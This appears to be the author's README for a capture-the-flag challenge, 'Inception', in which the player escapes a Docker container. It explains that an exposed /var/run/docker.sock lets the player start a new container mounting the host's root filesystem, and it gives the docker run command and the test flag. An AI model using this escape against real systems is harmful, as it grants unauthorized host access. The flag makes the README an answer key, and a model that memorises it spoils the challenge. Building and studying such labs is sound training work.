# Inception

###### Author: Tinius

### About

To solve you need to "escape" the current docker. And get the flag.txt on the "system" (First docker level) (But actually second level if you count CTF manager (docker in a docker in a docker)).

Mother docker = "2nd level system, but first level in the eyes of the user" ()

The machine = "3rd level system, but the seconds system in the eyes of the user. System the user connects to"

Mother docker is a container that runs The machine as a container aka docker in  docker, but the CTF player only needs to know that The machine is a container.

### Vulnerability
/var/run/docker.sock is available to call inside The machine, from there you can create a new container that mounts the mother's filesystem.

### How to solve.
#### Figuring out you are inside a container
1. Docker creates a .dockerenv file in the root directory of the container.
2. Hostname is some "random" string



#### Solving
You need to create a new container inside The machine that mounts the mother's root filesystem, there you can access flag.txt.

#### Connect
```
ssh ctfuser@localhost -p 40001
```

#### RUN
```
docker run -v /:/mnt --rm -it ubuntu
```

### Access flag.txt
```
cat /mnt/flag.txt

> CTFkom{test_flag}
```